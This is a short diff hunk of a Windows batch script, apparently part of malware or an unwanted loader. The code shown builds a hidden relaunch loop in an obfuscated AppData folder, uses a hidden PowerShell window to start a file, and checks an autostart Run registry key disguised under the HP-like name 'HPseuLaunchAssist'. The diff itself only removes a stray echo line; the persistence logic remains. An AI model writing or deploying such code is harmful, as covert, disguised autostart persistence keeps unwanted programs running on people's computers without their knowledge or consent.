@@ -83,7 +83,6 @@ echo if %errorlevel% equ 1 ( >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudh
 echo powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "& { Start-Process -FilePath '%full_path%' -WindowStyle Hidden }" >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
 echo ) >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
 echo goto loop >> %USERPROFILE%\AppData\Roaming\ifhoisudhifuhsiudhf"\inf.bat
-echo 
 :: checks if the registry key is there
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HPseuLaunchAssist" >nul 2>&1
 if %errorlevel% equ 0 (
